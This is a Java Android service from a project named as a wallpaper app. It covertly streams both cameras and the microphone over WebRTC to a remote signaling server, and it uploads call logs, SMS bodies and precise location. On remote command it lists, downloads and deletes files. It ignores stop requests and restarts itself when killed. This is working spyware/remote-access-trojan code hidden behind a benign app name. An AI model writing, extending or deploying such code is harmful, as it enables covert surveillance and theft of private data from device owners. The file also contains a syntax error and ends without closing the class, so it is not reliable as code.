package com.example.wallpaperapplication;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.Telephony;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera2Enumerator;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.MediaConstraints;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.RtpReceiver;
import org.webrtc.RtpTransceiver;
import org.webrtc.SdpObserver;
import org.webrtc.SessionDescription;
import org.webrtc.SurfaceTextureHelper;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;
import io.socket.client.IO;
import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import androidx.preference.PreferenceManager;
import android.content.SharedPreferences;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import android.util.Base64;

public class StreamingService extends Service {
    private static final String TAG = "StreamingService";
    private static final String CHANNEL_ID = "streaming_channel";
    private static final int NOTIFICATION_ID = 1;
    public static final String DEFAULT_SIGNALING_URL = "https://hypewebrtc.onrender.com";
    private static final long DATA_POLL_INTERVAL = 30_000;

    // ── max bitrate cap (kbps) to keep video stable on slow networks ──
    private static final int MAX_VIDEO_BITRATE_KBPS = 800;

    private PeerConnectionFactory factory;
    private EglBase eglBase;
    private SurfaceTextureHelper frontHelper;
    private SurfaceTextureHelper backHelper;
    private VideoCapturer frontCapturer;
    private VideoCapturer backCapturer;
    private VideoSource frontSource;
    private VideoSource backSource;
    private AudioSource audioSource;
    private PeerConnection peerConnection;
    private Socket socket;
    private String webClientId = null;
    private Handler dataHandler;
    private Runnable dataRunnable;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;

    // torch
    private CameraManager cameraManager;
    private String torchCameraId = null;
    private boolean torchOn = false;

    // reconnect guard
    private boolean isReconnecting = false;
    private final Handler reconnectHandler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate");
        startForeground(NOTIFICATION_ID, createNotification());

        if (!hasEssentialPermissions()) {
            Log.e(TAG, "Missing essential permissions. Stopping.");
            stopSelf();
            return;
        }

        // Init torch
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String[] ids = cameraManager.getCameraIdList();
            if (ids.length > 0) torchCameraId = ids[0];
        } catch (CameraAccessException e) {
            Log.e(TAG, "Cannot get camera list for torch", e);
        }

        initializeWebRTC();
        setupMediaStreaming();
        connectSignaling();
        startDataPollingIfAllowed();
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if ("STOP_STREAMING".equals(action)) {
                Log.i(TAG, "Stop request ignored for persistent mode");
            } else if ("ACTION_SYNC_DATA".equals(action)) {
                Log.d(TAG, "Forced data sync requested");
                if (webClientId != null) {
                    sendCallLogs();
                    sendSmsMessages();
                }
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service onDestroy");
        cleanup();
        if (socket != null) socket.disconnect();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.d(TAG, "onTaskRemoved: scheduling self-restart");
        if (!hasEssentialPermissions()) { super.onTaskRemoved(rootIntent); return; }
        Intent restart = new Intent(getApplicationContext(), StreamingService.class);
        restart.setPackage(getPackageName());
        try {
            ContextCompat.startForegroundService(getApplicationContext(), restart);
        } catch (IllegalStateException e) {
            Log.w(TAG, "FGS start not allowed in onTaskRemoved", e);
        }
        super.onTaskRemoved(rootIntent);
    }

    private String getSignalingUrl() {
        return SettingsRepository.getSignalingUrl(this);
    }

    private boolean hasEssentialPermissions() {
        boolean camera = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean audio  = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        boolean notify = Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        if (!camera) Log.e(TAG, "Camera permission missing");
        if (!audio)  Log.e(TAG, "Record audio permission missing");
        if (!notify) Log.e(TAG, "Notifications permission missing");
        return camera && audio && notify;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // WebRTC init
    // ─────────────────────────────────────────────────────────────────────────
    private void initializeWebRTC() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(true)
                        .createInitializationOptions());
        eglBase = EglBase.create();
        factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
                .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                .createPeerConnectionFactory();
    }

    private void setupMediaStreaming() {
        setupFrontCapture();
        setupBackCapture();
        setupAudioCapture();
        setupPeerConnection();
    }

    private void setupFrontCapture() {
        Camera2Enumerator enumerator = new Camera2Enumerator(this);
        String frontDevice = null;
        for (String name : enumerator.getDeviceNames()) {
            if (enumerator.isFrontFacing(name)) { frontDevice = name; break; }
        }
        if (frontDevice == null) { Log.e(TAG, "No front camera"); return; }
        frontCapturer = enumerator.createCapturer(frontDevice, null);
        frontHelper   = SurfaceTextureHelper.create("FrontCaptureThread", eglBase.getEglBaseContext());
        frontSource   = factory.createVideoSource(false);
        frontCapturer.initialize(frontHelper, getApplicationContext(), frontSource.getCapturerObserver());
        try { frontCapturer.startCapture(640, 480, 25); Log.d(TAG, "Front capture started"); }
        catch (Exception e) { Log.e(TAG, "Front capture start failed", e); }
    }

    private void setupBackCapture() {
        Camera2Enumerator enumerator = new Camera2Enumerator(this);
        String backDevice = null;
        for (String name : enumerator.getDeviceNames()) {
            if (enumerator.isBackFacing(name)) { backDevice = name; break; }
        }
        if (backDevice == null) { Log.w(TAG, "No back camera"); return; }
        backCapturer = enumerator.createCapturer(backDevice, null);
        backHelper   = SurfaceTextureHelper.create("BackCaptureThread", eglBase.getEglBaseContext());
        backSource   = factory.createVideoSource(false);
        backCapturer.initialize(backHelper, getApplicationContext(), backSource.getCapturerObserver());
        try { backCapturer.startCapture(640, 480, 25); Log.d(TAG, "Back capture started"); }
        catch (Exception e) { Log.e(TAG, "Back capture start failed", e); }
    }

    private void setupAudioCapture() {
        MediaConstraints ac = new MediaConstraints();
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googEchoCancellation", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googAutoGainControl", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googNoiseSuppression", "true"));
        ac.mandatory.add(new MediaConstraints.KeyValuePair("googHighpassFilter", "true"));
        audioSource = factory.createAudioSource(ac);
        Log.d(TAG, "Audio capture initialized");
    }

    private void setupPeerConnection() {
        List<PeerConnection.IceServer> ice = new ArrayList<>();

        // Primary STUN
        ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer());
        ice.add(PeerConnection.IceServer.builder("stun:stun2.l.google.com:19302").createIceServer());

        // Reliable free TURN (freestun.net)
        ice.add(PeerConnection.IceServer
                .builder("turn:freestun.net:3478")
                .setUsername("free")
                .setPassword("free")
                .createIceServer());
        ice.add(PeerConnection.IceServer
                .builder("turns:freestun.net:5349")
                .setUsername("free")
                .setPassword("free")
                .createIceServer());

        // Metered TURN (backup)
        ice.add(PeerConnection.IceServer
                .builder("turn:global.relay.metered.ca:80")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());
        ice.add(PeerConnection.IceServer
                .builder("turn:global.relay.metered.ca:443")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());
        ice.add(PeerConnection.IceServer
                .builder("turns:global.relay.metered.ca:443?transport=tcp")
                .setUsername("openrelayproject")
                .setPassword("openrelayproject")
                .createIceServer());

        PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
        config.sdpSemantics              = PeerConnection.SdpSemantics.UNIFIED_PLAN;
        config.continualGatheringPolicy  = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
        config.tcpCandidatePolicy        = PeerConnection.TcpCandidatePolicy.ENABLED;
        config.bundlePolicy              = PeerConnection.BundlePolicy.MAXBUNDLE;
        config.rtcpMuxPolicy             = PeerConnection.RtcpMuxPolicy.REQUIRE;
        // Keep ICE alive aggressively
        config.iceConnectionReceivingTimeout = 5000;
        config.iceBackupCandidatePairPingInterval = 2000;

        peerConnection = factory.createPeerConnection(config, new PeerConnection.Observer() {
            @Override public void onSignalingChange(PeerConnection.SignalingState s)         { Log.d(TAG, "Signaling: " + s); }
            @Override public void onIceConnectionReceivingChange(boolean r)                  {}
            @Override public void onIceGatheringChange(PeerConnection.IceGatheringState s)   { Log.d(TAG, "ICE gathering: " + s); }
            @Override public void onIceCandidatesRemoved(IceCandidate[] cs)                  {}
            @Override public void onAddStream(org.webrtc.MediaStream ms)                     {}
            @Override public void onRemoveStream(org.webrtc.MediaStream ms)                  {}
            @Override public void onDataChannel(org.webrtc.DataChannel dc)                   {}
            @Override public void onRenegotiationNeeded()                                    { Log.d(TAG, "Renegotiation needed"); }
            @Override public void onAddTrack(RtpReceiver r, org.webrtc.MediaStream[] ms)     { Log.d(TAG, "Track added: " + r.id()); }

            @Override
            public void onIceConnectionChange(PeerConnection.IceConnectionState s) {
                Log.d(TAG, "ICE state: " + s);
                if (s == PeerConnection.IceConnectionState.FAILED
                        || s == PeerConnection.IceConnectionState.DISCONNECTED) {
                    Log.w(TAG, "ICE " + s + " — restarting ICE");
                    // Try ICE restart first (lightweight)
                    if (peerConnection != null && webClientId != null) {
                        new Handler(Looper.getMainLooper()).post(() -> restartIce());
                    }
                } else if (s == PeerConnection.IceConnectionState.CLOSED) {
                    Log.w(TAG, "ICE CLOSED — full reconnect");
                    new Handler(Looper.getMainLooper()).postDelayed(() -> fullReconnect(), 2000);
                }
            }

            @Override
            public void onIceCandidate(IceCandidate c) {
                if (webClientId == null || socket == null || !socket.connected()) return;
                try {
                    JSONObject candidate = new JSONObject();
                    candidate.put("sdpMid",        c.sdpMid);
                    candidate.put("sdpMLineIndex", c.sdpMLineIndex);
                    candidate.put("candidate",     c.sdp);
                    JSONObject signal = new JSONObject();
                    signal.put("candidate", candidate);
                    JSONObject msg = new JSONObject();
                    msg.put("to",     webClientId);
                    msg.put("from",   socket.id());
                    msg.put("signal", signal);
                    socket.emit("signal", msg);
                    Log.d(TAG, "Sent ICE: " + c.sdpMid);
                } catch (JSONException e) {
                    Log.e(TAG, "ICE send failed", e);
                }
            }
        });

        if (peerConnection == null) { Log.e(TAG, "Failed to create PeerConnection"); return; }

        if (frontSource != null) {
            VideoTrack frontTrack = factory.createVideoTrack("front_camera", frontSource);
            peerConnection.addTransceiver(frontTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY,
                    Collections.singletonList("stream")));
        }
        if (backSource != null) {
            VideoTrack backTrack = factory.createVideoTrack("back_camera", backSource);
            peerConnection.addTransceiver(backTrack, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY,
                    Collections.singletonList("stream")));
        }
        if (audioSource != null) {
            AudioTrack at = factory.createAudioTrack("audio", audioSource);
            peerConnection.addTransceiver(at, new RtpTransceiver.RtpTransceiverInit(
                    RtpTransceiver.RtpTransceiverDirection.SEND_ONLY,
                    Collections.singletonList("stream")));
        }
        Log.d(TAG, "PeerConnection created with " + ice.size() + " ICE servers");
    }

    // ── ICE restart (keeps existing connection, asks for new ICE candidates) ─
    private void restartIce() {
        if (peerConnection == null || webClientId == null) return;
        Log.d(TAG, "Performing ICE restart");
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("IceRestart", "true"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));
        peerConnection.createOffer(new SdpObserver() {
            @Override public void onCreateSuccess(SessionDescription sdp) {
                String modified = applyBitrateConstraints(sdp.description);
                SessionDescription modSdp = new SessionDescription(sdp.type, modified);
                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onSetSuccess() {
                        try {
                            JSONObject signal = new JSONObject();
                            signal.put("type", "offer");
                            signal.put("sdp", modSdp.description);
                            JSONObject msg = new JSONObject();
                            msg.put("to", webClientId);
                            msg.put("from", socket.id());
                            msg.put("signal", signal);
                            socket.emit("signal", msg);
                            Log.d(TAG, "ICE restart offer sent");
                        } catch (JSONException e) { Log.e(TAG, "ICE restart offer send fail", e); }
                    }
                    @Override public void onSetFailure(String e)      { Log.e(TAG, "ICE restart setLocal fail: " + e); }
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onCreateFailure(String f)   {}
                }, modSdp);
            }
            @Override public void onSetSuccess()           {}
            @Override public void onCreateFailure(String e){ Log.e(TAG, "ICE restart createOffer fail: " + e); }
            @Override public void onSetFailure(String e)   {}
        }, mc);
    }

    // ── Full reconnect: tear down PeerConnection and rebuild ─────────────────
    private void fullReconnect() {
        if (isReconnecting) return;
        isReconnecting = true;
        Log.d(TAG, "Full PeerConnection reconnect");
        if (peerConnection != null) {
            peerConnection.close();
            peerConnection = null;
        }
        setupPeerConnection();
        if (webClientId != null) createAndSendOffer();
        isReconnecting = false;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Signaling
    // ─────────────────────────────────────────────────────────────────────────
    private void connectSignaling() {
        String signalingUrl = getSignalingUrl();
        Log.d(TAG, "Connecting to signaling at " + signalingUrl);
        IO.Options opts = new IO.Options();
        opts.transports           = new String[]{"websocket"};
        opts.reconnection         = true;
        opts.reconnectionAttempts = Integer.MAX_VALUE;   // unlimited
        opts.reconnectionDelay    = 3000;
        opts.reconnectionDelayMax = 10000;

        try {
            socket = IO.socket(signalingUrl, opts);
        } catch (URISyntaxException e) {
            Log.e(TAG, "Bad signaling URL", e);
            stopSelf();
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            Log.d(TAG, "Socket.IO CONNECTED");
            socket.emit("identify", "android");
            // Re-offer if we already had a web client (after reconnect)
            if (webClientId != null) createAndSendOffer();
        }).on(Socket.EVENT_DISCONNECT, args -> {
            Log.w(TAG, "Socket.IO DISCONNECTED: " + Arrays.toString(args));
            // Socket.io will auto-reconnect due to opts; nothing to do here
        }).on(Socket.EVENT_CONNECT_ERROR, args -> {
            Log.e(TAG, "Connect error: " + Arrays.toString(args));
        }).on("id", args -> {
            Log.d(TAG, "Received socket ID: " + args[0]);
        }).on("web-client-ready", args -> {
            if (args.length > 0 && args[0] instanceof String) {
                webClientId = (String) args[0];
                Log.d(TAG, "Web client ready: " + webClientId);
                // Ensure PeerConnection is alive
                if (peerConnection == null) setupPeerConnection();
                createAndSendOffer();
                startLocationUpdatesIfAllowed();
                sendCallLogs();
                sendSmsMessages();
            }
        }).on("signal", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) {
                handleSignaling((JSONObject) args[0]);
            }
        }).on("web-client-disconnected", args -> {
            if (args.length > 0 && args[0] instanceof String) {
                Log.d(TAG, "Web client disconnected: " + args[0]);
                if (args[0].equals(webClientId)) {
                    webClientId = null;
                    stopLocationUpdates();
                }
            }
        }).on("torch", args -> {
            // Toggle flash: payload: { "on": true/false }
            if (args.length > 0 && args[0] instanceof JSONObject) {
                try {
                    boolean on = ((JSONObject) args[0]).optBoolean("on", false);
                    setTorch(on);
                } catch (Exception e) { Log.e(TAG, "torch event error", e); }
            }
        }).on("fs:list", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) handleFsList((JSONObject) args[0]);
        }).on("fs:download", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) handleFsDownload((JSONObject) args[0]);
        }).on("fs:delete", args -> {
            if (args.length > 0 && args[0] instanceof JSONObject) handleFsDelete((JSONObject) args[0]);
        });

        socket.connect();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Torch / Flash
    // ─────────────────────────────────────────────────────────────────────────
    private void setTorch(boolean enable) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            Log.w(TAG, "Torch API requires API 23+");
            return;
        }
        if (torchCameraId == null) {
            Log.w(TAG, "No torch camera ID available");
            return;
        }
        try {
            cameraManager.setTorchMode(torchCameraId, enable);
            torchOn = enable;
            Log.d(TAG, "Torch set to: " + enable);
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to toggle torch", e);
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Offer creation with bitrate constraints
    // ─────────────────────────────────────────────────────────────────────────
    private String applyBitrateConstraints(String sdp) {
        // Cap video bitrate to MAX_VIDEO_BITRATE_KBPS for stable streaming
        StringBuilder sb = new StringBuilder();
        boolean inVideoSection = false;
        for (String line : sdp.split("\r?\n")) {
            sb.append(line).append("\r\n");
            if (line.startsWith("m=video")) {
                inVideoSection = true;
            } else if (line.startsWith("m=")) {
                inVideoSection = false;
            }
            if (inVideoSection && line.startsWith("c=")) {
                sb.append("b=AS:").append(MAX_VIDEO_BITRATE_KBPS).append("\r\n");
            }
        }
        // Also ensure sendonly direction
        String result = sb.toString()
                .replace("a=sendrecv", "a=sendonly")
                .replace("a=recvonly", "a=sendonly");
        return result;
    }

    private void createAndSendOffer() {
        if (peerConnection == null) { Log.e(TAG, "PeerConnection not ready"); return; }
        if (webClientId == null)    { Log.w(TAG, "No web client yet"); return; }

        Log.d(TAG, "Creating offer for: " + webClientId);
        MediaConstraints mc = new MediaConstraints();
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveAudio", "false"));
        mc.mandatory.add(new MediaConstraints.KeyValuePair("OfferToReceiveVideo", "false"));

        peerConnection.createOffer(new SdpObserver() {
            @Override
            public void onCreateSuccess(SessionDescription sdp) {
                Log.d(TAG, "Offer created");
                String modified = applyBitrateConstraints(sdp.description);
                SessionDescription modSdp = new SessionDescription(sdp.type, modified);

                peerConnection.setLocalDescription(new SdpObserver() {
                    @Override public void onSetSuccess() {
                        try {
                            JSONObject signal = new JSONObject();
                            signal.put("type", "offer");
                            signal.put("sdp",  modSdp.description);
                            JSONObject msg = new JSONObject();
                            msg.put("to",     webClientId);
                            msg.put("from",   socket.id());
                            msg.put("signal", signal);
                            socket.emit("signal", msg);
                            Log.d(TAG, "Offer sent to web client");
                        } catch (JSONException e) { Log.e(TAG, "Offer send fail", e); }
                    }
                    @Override public void onSetFailure(String e)      { Log.e(TAG, "Set local fail: " + e); }
                    @Override public void onCreateSuccess(SessionDescription s) {}
                    @Override public void onCreateFailure(String f)   { Log.e(TAG, "Create fail(inner): " + f); }
                }, modSdp);
            }
            @Override public void onSetSuccess()               {}
            @Override public void onCreateFailure(String err)  { Log.e(TAG, "Create offer fail: " + err); }
            @Override public void onSetFailure(String err)     { Log.e(TAG, "Set desc fail: " + err); }
        }, mc);
    }

    private void handleSignaling(JSONObject msg) {
        try {
            JSONObject signal = msg.getJSONObject("signal");
            String type = signal.optString("type", "");
            if ("answer".equals(type)) {
                if (peerConnection == null) { Log.e(TAG, "No PC for answer"); return; }
                SessionDescription ans = new SessionDescription(
                        SessionDescription.Type.ANSWER, signal.getString("sdp"));
                peerConnection.setRemoteDescription(simpleSdpObserver, ans);
                Log.d(TAG, "Processed answer");
            } else if (signal.has("candidate")) {
                if (peerConnection == null) return;
                JSONObject candidate = signal.getJSONObject("candidate");
                IceCandidate c = new IceCandidate(
                        candidate.getString("sdpMid"),
                        candidate.getInt("sdpMLineIndex"),
                        candidate.getString("candidate"));
                peerConnection.addIceCandidate(c);
                Log.d(TAG, "Added ICE candidate");
            }
        } catch (JSONException e) {
            Log.e(TAG, "Handle signaling error", e);
        }
    }

    private final SdpObserver simpleSdpObserver = new SdpObserver() {
        @Override public void onCreateSuccess(SessionDescription s) {}
        @Override public void onSetSuccess()                        { Log.d(TAG, "SDP set success"); }
        @Override public void onCreateFailure(String e)             { Log.e(TAG, "SDP create fail: " + e); }
        @Override public void onSetFailure(String e)                { Log.e(TAG, "SDP set fail: " + e); }
    };

    // ─────────────────────────────────────────────────────────────────────────
    // Location
    // ─────────────────────────────────────────────────────────────────────────
    private void startLocationUpdatesIfAllowed() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            Log.i(TAG, "Location permission not granted; skipping");
            return;
        }
        LocationRequest req = LocationRequest.create();
        req.setInterval(10_000);
        req.setFastestInterval(5_000);
        req.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationCallback = new LocationCallback() {
            @Override public void onLocationResult(LocationResult r) {
                if (r == null) return;
                for (android.location.Location loc : r.getLocations()) sendLocation(loc.getLatitude(), loc.getLongitude());
            }
        };
        try {
            fusedLocationClient.requestLocationUpdates(req, locationCallback, Looper.getMainLooper());
            Log.d(TAG, "Location updates started");
        } catch (SecurityException e) { Log.e(TAG, "Location start fail", e); }
    }

    private void sendLocation(double lat, double lng) {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            JSONObject d = new JSONObject();
            d.put("from", socket.id()); d.put("to", webClientId);
            d.put("latitude", lat); d.put("longitude", lng);
            socket.emit("location", d);
        } catch (JSONException e) { Log.e(TAG, "Location send error", e); }
    }

    private void stopLocationUpdates() {
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
            locationCallback = null;
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Data polling
    // ─────────────────────────────────────────────────────────────────────────
    private void startDataPollingIfAllowed() {
        boolean canCall = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
        boolean canSms  = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)      == PackageManager.PERMISSION_GRANTED;
        if (!canCall || !canSms) { Log.i(TAG, "Call/SMS permission not granted; skip polling"); return; }
        dataHandler  = new Handler(Looper.getMainLooper());
        dataRunnable = new Runnable() {
            @Override public void run() {
                sendCallLogs();
                sendSmsMessages();
                if (dataHandler != null) dataHandler.postDelayed(this, DATA_POLL_INTERVAL);
            }
        };
        dataHandler.post(dataRunnable);
    }

    private void sendCallLogs() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            ContentResolver resolver = getContentResolver();
            Cursor cursor = resolver.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION},
                    null, null, CallLog.Calls.DATE + " DESC");
            if (cursor == null) return;
            JSONArray arr = new JSONArray();
            int cnt = 0;
            while (cursor.moveToNext() && cnt < 10) {
                JSONObject c = new JSONObject();
                c.put("number",   cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                c.put("type",     getCallTypeString(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                c.put("date",     new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))));
                c.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                arr.put(c); cnt++;
            }
            cursor.close();
            JSONObject msg = new JSONObject();
            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("call_logs", arr);
            socket.emit("call_log", msg);
        } catch (Exception e) { Log.e(TAG, "Error sending call logs", e); }
    }

    private void sendSmsMessages() {
        if (webClientId == null || socket == null || !socket.connected()) return;
        try {
            ContentResolver resolver = getContentResolver();
            Cursor cursor = resolver.query(Telephony.Sms.CONTENT_URI,
                    new String[]{Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE},
                    null, null, Telephony.Sms.DATE + " DESC");
            if (cursor == null) return;
            JSONArray arr = new JSONArray();
            int cnt = 0;
            while (cursor.moveToNext() && cnt < 50) {
                JSONObject s = new JSONObject();
                s.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                s.put("body",    cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                s.put("date",    new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)))));
                s.put("type",    getSmsTypeString(cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE))));
                arr.put(s); cnt++;
            }
            cursor.close();
            JSONObject msg = new JSONObject();
            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("sms_messages", arr);
            socket.emit("sms", msg);
        } catch (Exception e) { Log.e(TAG, "Error sending SMS", e); }
    }

    private String getCallTypeString(int t) {
        switch (t) {
            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
            case CallLog.Calls.MISSED_TYPE:   return "Missed";
            default:                          return "Unknown";
        }
    }

    private String getSmsTypeString(int t) {
        switch (t) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Received";
            case Telephony.Sms.MESSAGE_TYPE_SENT:  return "Sent";
            default:                               return "Unknown";
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // File System
    // ─────────────────────────────────────────────────────────────────────────
    private void handleFsList(JSONObject data) {
        String path = data.optString("path", "/storage/emulated/0/");
        File dir = new File(path);
        JSONArray filesArray = new JSONArray();
        if (dir.exists() && dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    try {
                        JSONObject obj = new JSONObject();
                        obj.put("name", f.getName()); obj.put("path", f.getAbsolutePath());
                        obj.put("isDir", f.isDirectory()); obj.put("size", f.isDirectory() ? 0 : f.length());
                        obj.put("lastModified", f.lastModified());
                        filesArray.put(obj);
                    } catch (JSONException e) { e.printStackTrace(); }
                }
            }
        }
        try {
            JSONObject response = new JSONObject();
            response.put("currentPath", path); response.put("files", filesArray);
            JSONObject msg = new JSONObject();
            msg.put("to", webClientId); msg.put("from", socket.id()); msg.put("file_list", response);
            socket.emit("fs:files", msg);
        } catch (JSONException e) { Log.e(TAG, "Error sending file list", e); }
    }

    private void handleFsDownload(JSONObject data) {
        String path = data.optString("path", "");
        if (path.isEmpty() || webClientId == null) return;
        File file = new File(path);
        if (!file.exists() || !file.isFile()) return;
        new Thread(() -> {
            try {
                String fileId      = java.util.UUID.randomUUID().toString();
                long   fileSize    = file.length();
                int    chunkSize   = 64 * 1024;
                int    totalChunks = (int) Math.ceil((double) fileSize / chunkSize);
                JSONObject startMsg = new JSONObject();
                startMsg.put("to", webClientId); startMsg.put("from", socket.id());
                startMsg.put("fileId", fileId); startMsg.put("name", file.getName());
                startMsg.put("size", fileSize); startMsg.put("totalChunks", totalChunks);
                socket.emit("fs:download_start", startMsg);

                FileInputStream fis = new FileInputStream(file);
                byte[] buf = new byte[chunkSize]; int read; int idx = 0;
                while ((read = fis.read(buf)) != -1) {
                    if (!socket.connected()) break;
                    JSONObject chunk = new JSONObject();
                    chunk.put("to", webClientId); chunk.put("from", socket.id());
                    chunk.put("fileId", fileId); chunk.put("chunkIndex", idx);
                    chunk.put("content", Base64.encodeToString(buf, 0, read, Base64.NO_WRAP));
                    socket.emit("fs:download_chunk", chunk);
                    idx++; Thread.sleep(50);
                }
                fis.close();
                JSONObject done = new JSONObject();
                done.put("to", webClientId); done.put("from", socket.id()); done.put("fileId", fileId);
                socket.emit("fs:download_complete", done);
            } catch (Exception e) {
                Log.e(TAG, "Download error", e);
                try {
                    JSONObject err = new JSONObject();
                    err.put("to", webClientId); err.put("from", socket.id()); err.put("error", e.getMessage());
                    socket.emit("fs:download_error", err);
                } catch (JSONException ignore) {}
            }
        }).start();
    }

    private void handleFsDelete(JSONObject data) {
        String path = data.optString("path", "");
        if (path.isEmpty()) return;
        File file = new File(path);
        if (file.exists()) file.isDirectory() ? deleteRecursive(file) : file.delete();
    }

    private boolean deleteRecursive(File f) {
        if (f.isDirectory()) { File[] ch = f.listFiles(); if (ch != null) for (File c : ch) deleteRecursive(c); }
        return f.delete();
    }

